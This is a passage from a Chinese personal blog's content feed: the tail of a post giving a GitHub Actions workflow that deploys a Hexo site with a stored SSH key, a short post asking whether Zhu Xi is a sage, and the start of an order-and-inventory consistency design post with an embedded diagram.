class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># This workflow will do a clean installation of node dependencies, cache/restore them, build the source code and run tests across different versions of node</span></span><br><span class="line"><span class="comment"># For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-nodejs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">CI</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span> [<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span> [<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">strategy:</span></span><br><span class="line">      <span class="attr">matrix:</span></span><br><span class="line">        <span class="comment"># See supported Node.js release schedule at https://nodejs.org/en/about/releases/</span></span><br><span class="line">        <span class="attr">node-version:</span> [<span class="number">18.</span><span class="string">x</span>]</span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node-version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node-version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">cache:</span> <span class="string">&#x27;npm&#x27;</span></span><br><span class="line">      <span class="comment"># Set github ssh private key to ~/.ssh/id_rsa</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Add</span> <span class="string">Github</span> <span class="string">Deploy</span> <span class="string">SSH</span> <span class="string">Private</span> <span class="string">Key</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">SECRET_DEPLOY_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.DEPLOY_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$SECRET_DEPLOY_KEY&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan -t rsa github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string"></span>      <span class="comment"># Set git client config --global user</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">Git</span> <span class="string">Config</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;27856297+dependabot-preview[bot]@users.noreply.github.com&quot;</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;github-actions[bot]&quot;</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Clone</span> <span class="string">Themes</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">git</span> <span class="string">clone</span> <span class="string">https://github.com/probberechts/hexo-theme-cactus.git</span> <span class="string">themes/cactus</span></span><br><span class="line">      <span class="comment"># Caching dependencies to speed up workflows. (GitHub will remove any cache entries that have not been accessed in over 7 days.)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Cache</span> <span class="string">node</span> <span class="string">modules</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/cache@v3</span></span><br><span class="line">        <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">$&#123;&#123;</span> <span class="string">runner.os</span> <span class="string">&#125;&#125;-node-$&#123;&#123;</span> <span class="string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">restore-keys:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            $&#123;&#123; runner.os &#125;&#125;-node-</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Dependencies</span></span><br><span class="line">        <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">ci</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">clean</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Build</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">build</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://hexo.io/docs/github-pages.html">hexo-github-pages</a></li><li><a href="https://github.com/sma11black/hexo-action/blob/master/entrypoint.sh">sma11black&#x2F;hexo-action</a></li><li><a href="https://docs.github.com/en/actions/security-guides/encrypted-secrets">github-actions-encrypted-secrets</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>朱熹是圣人吗？</title>
      <link href="/2023/03/31/%E6%9C%B1%E7%86%B9%E6%98%AF%E5%9C%A3%E4%BA%BA%E5%90%97/"/>
      <url>/2023/03/31/%E6%9C%B1%E7%86%B9%E6%98%AF%E5%9C%A3%E4%BA%BA%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h2 id="明朝那些事儿"><a href="#明朝那些事儿" class="headerlink" title="明朝那些事儿"></a>明朝那些事儿</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">自古以来，有这样一群僧人，他们遵守戒律，不吃肉，不喝酒，整日诵经念佛，而与其他和尚不同的是，他们往往几十年坐着不动，甚至有的鞭打折磨自己的身体，痛苦不堪却依然故我。</span><br><span class="line">有这样一群习武者，经过多年磨炼，武艺已十分高强，但他们却更为努力地练习，坚持不辍。</span><br><span class="line">有这样一群读书人，他们有的已经学富五车，甚至功成名就，却依然日夜苦读，不论寒暑。</span><br><span class="line">他们并不是精神错乱、平白无故给自己找麻烦的白痴，如此苦心苦行，只是为了寻找一样东西。</span><br><span class="line">传说这个世界上存在着一种神奇的东西，它无影无形，却又无处不在，轻若无物，却又重如泰山，如果能够获知这一样东西，就能够了解这个世界上的所有的奥秘，看透所有伪装，通晓所有知识，天下万物皆可归于掌握！</span><br><span class="line">这并不是传说，而是客观存在的事实。</span><br><span class="line">这样东西的名字叫做“道”。</span><br><span class="line">所谓道，是天下所有规律的总和，是最根本的法则，只要能够了解道，就可以明了世间所有的一切。</span><br><span class="line"></span><br><span class="line">这实在是一个太大的诱惑，所以几千年来，它一直吸引着无数人前仆后继地追寻。更为重要的是，事实证明，道不但是存在的，也是可以为人所掌握的。</span><br><span class="line">对于不同种类的追寻者而言，道有着不同的表现方式，对于和尚们来说，道的名字叫做“悟”，对于朱熹这类读书人而言，它的名字叫“理”。</span><br><span class="line">和尚们梦寐以求追寻的“悟”，并不是虚无缥缈的，事实上，它是一种极为玄妙的快感，远远胜过世间所有的欢悦和一切精神药品，到此境界者，视万物如无物，无忧无虑，无喜无悲，愉悦之情常驻于心。佛法谓之“开悟”。</span><br><span class="line">最著名的“开悟”者就是“六祖”慧能，之后的德山和尚与临济和尚也闻名于世。</span><br><span class="line">穷诸玄辨，若一毫置于太虚；竭世枢机，似一滴投于巨壑。</span><br><span class="line">此即所谓佛者之道。</span><br><span class="line">而关于武者的道，大致可以用这样一个故事来说明：</span><br><span class="line">按照武术中的说法，兵器是越长越好，即所谓“一寸长，一寸强”。但据说五代年间，有一位高手用剑，却是越用越短，到后来他五六十岁了，剑法出神入化之时，居然不用剑了，每逢打架都是光膀子上阵，却从未打败过。</span><br><span class="line">当我看到这个故事时，才真正开始相信一句小说中的常用语：</span><br><span class="line">手中无剑，心中有剑。”</span><br><span class="line">朱熹的道源自儒家，又叫做“理”，既不是开悟，也不是练习武术，这玩意儿是从书中读出来的，而且还是能够拿出去用的，一旦通理，便尽知天下万物万事，胸怀宽广，宠辱不惊，无惧无畏，可修身，可齐家，可治国，可平天下！</span><br><span class="line">唯天下至诚，能尽其性；能尽其性，则能尽人之性；能尽人之性，则能尽物之性；能尽物之性，则可赞天下之化育；可以赞天下之化育，则可以与天地参矣！</span><br><span class="line">此即儒家之道。</span><br></pre></td></tr></table></figure><h2 id="朱熹、老子、庄子、孔子、王阳明在中国哲学上的评价高低"><a href="#朱熹、老子、庄子、孔子、王阳明在中国哲学上的评价高低" class="headerlink" title="朱熹、老子、庄子、孔子、王阳明在中国哲学上的评价高低"></a>朱熹、老子、庄子、孔子、王阳明在中国哲学上的评价高低</h2><p>朱熹、老子、庄子、孔子、王阳明都是中国哲学史上的重要人物，他们的思想对中国哲学产生了深远的影响。以下是他们在中国哲学上的评价：</p><ol><li><p>孔子：孔子是儒家学派的创始人，儒家思想在中国历史上占据了重要地位。孔子提倡“仁爱”、“忠诚”、“孝道”等思想，被誉为“千古圣贤”。他的思想强调人的道德修养和社会责任，对中国传统文化和社会制度产生了深远的影响。</p></li><li><p>庄子：庄子是道家学派的代表人物，他的思想强调“无为而治”、“自然而然”等观念，倡导人们追求心灵自由和身心的平衡。他的思想对中国文化和哲学产生了深远的影响，尤其是在文学、艺术和宗教领域。</p></li><li><p>老子：老子是道家学派的创始人，他的思想强调“道”、“无为而治”等观念，认为宇宙万物都是由“道”所构成的。他的思想对中国哲学和文化产生了深远的影响，被誉为“道家之祖”。</p></li><li><p>朱熹：朱熹是宋明理学的代表人物，他的思想强调“格物致知”、“诚实守信”等观念，认为通过对事物的研究和思考可以达到认识真理的目的。他的思想对中国哲学和文化产生了深远的影响，成为中国传统文化中的重要组成部分。</p></li><li><p>王阳明：王阳明是明朝理学家和思想家，他的思想强调“知行合一”、“致良知”等观念，认为人的内心本质是良知，只有通过不断的修养和实践才能达到真正的自我实现。他的思想对中国的文化和哲学产生了深远的影响，被誉为“阳明心学”的代表人物。</p></li></ol><p>这些哲学家都是中国文化和哲学史上的重要人物，他们的思想和理论对中国文化和社会制度产生了深远的影响，成为中国传统文化的重要组成部分。</p><h2 id="朱熹是圣人吗？"><a href="#朱熹是圣人吗？" class="headerlink" title="朱熹是圣人吗？"></a>朱熹是圣人吗？</h2><p>在中国传统文化中，朱熹被尊为“朱子先生”，并被视为理学派的代表人物之一。然而，朱熹并没有被奉为圣人，他只是中国历史上的一位杰出人物，他的思想和贡献得到了广泛的认可和尊重。值得注意的是，中国传统文化中的“圣人”一词，通常用来指代具有卓越的道德和智慧的人物，如孔子、孟子等。因此，朱熹虽然被尊为先贤大师，但并没有被视为圣人。</p>]]></content>
      
      
      <categories>
          
          <category> Philosophy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Philosophy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个账户、下单、库存之间的一致性流程架构</title>
      <link href="/2022/06/19/%E4%B8%80%E4%B8%AA%E8%B4%A6%E6%88%B7%E3%80%81%E4%B8%8B%E5%8D%95%E3%80%81%E5%BA%93%E5%AD%98%E4%B9%8B%E9%97%B4%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7%E6%B5%81%E7%A8%8B%E6%9E%B6%E6%9E%84/"/>
      <url>/2022/06/19/%E4%B8%80%E4%B8%AA%E8%B4%A6%E6%88%B7%E3%80%81%E4%B8%8B%E5%8D%95%E3%80%81%E5%BA%93%E5%AD%98%E4%B9%8B%E9%97%B4%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7%E6%B5%81%E7%A8%8B%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>设计了一个账户余额、下单、库存之间的流程架构，考虑 CAP&#x2F;BASE 理论并满足数据一致性要求。</p><img class="kroki" src='data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaGVpZ2h0PSIxNDM5cHgiIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiIHN0eWxlPSJ3aWR0aDoxNDEwcHg7aGVpZ2h0OjE0MzlweDtiYWNrZ3JvdW5kOiNGRkZGRkY7IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxNDEwIDE0MzkiIHdpZHRoPSIxNDEwcHgiIHpvb21BbmRQYW49Im1hZ25pZnkiPjxkZWZzLz48Zz48cmVjdCBmaWxsPSJub25lIiBoZWlnaHQ9IjI5Ni4zMjgxIiBzdHlsZT0ic3Ryb2tlOiMwMDAwMDA7c3Ryb2tlLXdpZHRoOjEuNTsiIHdpZHRoPSI4NzUiIHg9IjEwIiB5PSIxODIuODI4MSIvPjxyZWN0IGZpbGw9Im5vbmUiIGhlaWdodD0iNzUuMzk4NCIgc3R5bGU9InN0cm9rZTojMDAwMDAwO3N0cm9rZS13aWR0aDoxLjU7IiB3aWR0aD0iODI2IiB4PSIyMCIgeT0iMzA3LjM1OTQiLz48cmVjdCBmaWxsPSJub25lIiBoZWlnaHQ9Ijc1LjM5ODQiIHN0eWxlPSJzdHJva2U6IzAwMDAwMDtzdHJva2Utd2lkdGg6MS41OyIgd2lkdGg9IjgyNiIgeD0iMjAiIHk9IjM5Ni43NTc4Ii8+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIzMDkuMzI4MSIgc3R5bGU9InN0cm9rZTojMDAwMDAwO3N0cm9rZS13aWR0aDoxLjU7IiB3aWR0aD0iMTEyMS41IiB4PSIxMCIgeT0iNDkzLjE1NjMiLz48cmVjdCBmaWxsPSJub25lIiBoZWlnaHQ9IjExNy41MzEzIiBzdHlsZT0ic3Ryb2tlOiMwMDAwMDA7c3Ryb2tlLXdpZHRoOjEuNTsiIHdpZHRoPSI5MDkuNSIgeD0iMjEyIiB5PSI1NDYuNDIxOSIvPjxyZWN0IGZpbGw9Im5vbmUiIGhlaWdodD0iMTE3LjUzMTMiIHN0eWxlPSJzdHJva2U6IzAwMDAwMDtzdHJva2Utd2lkdGg6MS41OyIgd2lkdGg9IjY0NiIgeD0iMjAiIHk9IjY3Ny45NTMxIi8+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSI4OC4zOTg0IiBzdHlsZT0ic3Ryb2tlOiMwMDAwMDA7c3Ryb2tlLXdpZHRoOjEuNTsiIHdpZHRoPSIzNjUuNSIgeD0iNzU2IiB5PSI5MDMuODgyOCIvPjxyZWN0IGZpbGw9Im5vbmUiIGhlaWdodD0iODguMzk4NCIgc3R5bGU9InN0cm9rZTojMDAwMDAwO3N0cm9rZS13aWR0aDoxLjU7IiB3aWR0aD0iNTczLjUiIHg9IjU0OCIgeT0iMTAwNi4yODEzIi8+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIxMzAuNTMxMyIgc3R5bGU9InN0cm9rZTojMDAwMDAwO3N0cm9rZS13aWR0aDoxLjU7IiB3aWR0aD0iOTA5LjUiIHg9IjIxMiIgeT0iMTEwOC42Nzk3Ii8+PHJlY3QgZmlsbD0ibm9uZSIgaGVpZ2h0PSIxMzMuNjY0MSIgc3R5bGU9InN0cm9rZTojMDAwMDAwO3N0cm9rZS13aWR0aDoxLjU7IiB3aWR0aD0iMTE5MiIgeD0iMjEyIiB5PSIxMjUzLjIxMDkiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTtzdHJva2UtZGFzaGFycmF5OjUuMCw1LjA7IiB4MT0iNTEiIHgyPSI1MSIgeTE9IjM2LjI5NjkiIHkyPSIxNDAzLjg3NSIvPjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41O3N0cm9rZS1kYXNoYXJyYXk6NS4wLDUuMDsiIHgxPSIyNTciIHgyPSIyNTciIHkxPSIzNi4yOTY5IiB5Mj0iMTQwMy44NzUiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTtzdHJva2UtZGFzaGFycmF5OjUuMCw1LjA7IiB4MT0iNjA3IiB4Mj0iNjA3IiB5MT0iMzYuMjk2OSIgeTI9IjE0MDMuODc1Ii8+PGxpbmUgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7c3Ryb2tlLWRhc2hhcnJheTo1LjAsNS4wOyIgeDE9IjgwMSIgeDI9IjgwMSIgeTE9IjM2LjI5NjkiIHkyPSIxNDAzLjg3NSIvPjxsaW5lIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41O3N0cm9rZS1kYXNoYXJyYXk6NS4wLDUuMDsiIHgxPSIxMDkyLjUiIHgyPSIxMDkyLjUiIHkxPSIzNi4yOTY5IiB5Mj0iMTQwMy44NzUiLz48bGluZSBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTtzdHJva2UtZGFzaGFycmF5OjUuMCw1LjA7IiB4MT0iMTM1OSIgeDI9IjEzNTkiIHkxPSIzNi4yOTY5IiB5Mj0iMTQwMy44NzUiLz48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9IjQyIiB4PSIzMCIgeT0iNSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjI4IiB4PSIzNyIgeT0iMjQuOTk1MSI+55So5oi3PC90ZXh0PjxyZWN0IGZpbGw9IiNFMkUyRjAiIGhlaWdodD0iMzAuMjk2OSIgcng9IjIuNSIgcnk9IjIuNSIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7IiB3aWR0aD0iNDIiIHg9IjMwIiB5PSIxNDAyLjg3NSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjI4IiB4PSIzNyIgeT0iMTQyMi44NzAxIj7nlKjmiLc8L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSI3MCIgeD0iMjIyIiB5PSI1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiIGxlbmd0aEFkanVzdD0ic3BhY2luZyIgdGV4dExlbmd0aD0iNTYiIHg9IjIyOSIgeT0iMjQuOTk1MSI+6K6i5Y2V57O757ufPC90ZXh0PjxyZWN0IGZpbGw9IiNFMkUyRjAiIGhlaWdodD0iMzAuMjk2OSIgcng9IjIuNSIgcnk9IjIuNSIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7IiB3aWR0aD0iNzAiIHg9IjIyMiIgeT0iMTQwMi44NzUiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI1NiIgeD0iMjI5IiB5PSIxNDIyLjg3MDEiPuiuouWNleezu+e7nzwvdGV4dD48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9Ijk4IiB4PSI1NTgiIHk9IjUiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI4NCIgeD0iNTY1IiB5PSIyNC45OTUxIj7kvZnpop3otKbmiLfmnI3liqE8L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSI5OCIgeD0iNTU4IiB5PSIxNDAyLjg3NSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9Ijg0IiB4PSI1NjUiIHk9IjE0MjIuODcwMSI+5L2Z6aKd6LSm5oi35pyN5YqhPC90ZXh0PjxyZWN0IGZpbGw9IiNFMkUyRjAiIGhlaWdodD0iMzAuMjk2OSIgcng9IjIuNSIgcnk9IjIuNSIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDowLjU7IiB3aWR0aD0iNzAiIHg9Ijc2NiIgeT0iNSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjU2IiB4PSI3NzMiIHk9IjI0Ljk5NTEiPuW6k+WtmOezu+e7nzwvdGV4dD48cmVjdCBmaWxsPSIjRTJFMkYwIiBoZWlnaHQ9IjMwLjI5NjkiIHJ4PSIyLjUiIHJ5PSIyLjUiIHN0eWxlPSJzdHJva2U6IzE4MTgxODtzdHJva2Utd2lkdGg6MC41OyIgd2lkdGg9IjcwIiB4PSI3NjYiIHk9IjE0MDIuODc1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiIGxlbmd0aEFkanVzdD0ic3BhY2luZyIgdGV4dExlbmd0aD0iNTYiIHg9Ijc3MyIgeT0iMTQyMi44NzAxIj7lupPlrZjns7vnu588L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSIzNyIgeD0iMTA3NC41IiB5PSI1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTQiIGxlbmd0aEFkanVzdD0ic3BhY2luZyIgdGV4dExlbmd0aD0iMjMiIHg9IjEwODEuNSIgeT0iMjQuOTk1MSI+TVE8L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSIzNyIgeD0iMTA3NC41IiB5PSIxNDAyLjg3NSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjIzIiB4PSIxMDgxLjUiIHk9IjE0MjIuODcwMSI+TVE8L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSI3MCIgeD0iMTMyNCIgeT0iNSIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjE0IiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjU2IiB4PSIxMzMxIiB5PSIyNC45OTUxIj7mjqjpgIHns7vnu588L3RleHQ+PHJlY3QgZmlsbD0iI0UyRTJGMCIgaGVpZ2h0PSIzMC4yOTY5IiByeD0iMi41IiByeT0iMi41IiBzdHlsZT0ic3Ryb2tlOiMxODE4MTg7c3Ryb2tlLXdpZHRoOjAuNTsiIHdpZHRoPSI3MCIgeD0iMTMyNCIgeT0iMTQwMi44NzUiLz48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI1NiIgeD0iMTMzMSIgeT0iMTQyMi44NzAxIj7mjqjpgIHns7vnu588L3RleHQ+PHBvbHlnb24gZmlsbD0iIzE4MTgxOCIgcG9pbnRzPSIyNDUsNjMuNDI5NywyNTUsNjcuNDI5NywyNDUsNzEuNDI5NywyNDksNjcuNDI5NyIgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDoxLjA7Ii8+PGxpbmUgc3R5bGU9InN0cm9rZTojMTgxODE4O3N0cm9rZS13aWR0aDoxLjA7IiB4MT0iNTEiIHgyPSIyNTEiIHkxPSI2Ny40Mjk3IiB5Mj0iNjcuNDI5NyIvPjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iYm9sZCIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSI5IiB4PSI1OCIgeT0iNjIuMzYzOCI+MTwvdGV4dD48dGV4dCBmaWxsPSIjMDAwMDAwIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMyIgbGVuZ3RoQWRqdXN0PSJzcGFjaW5nIiB0ZXh0TGVuZ3RoPSIyNiIgeD0iNzEiIHk9IjYyLjM2MzgiPuS4i+WNlT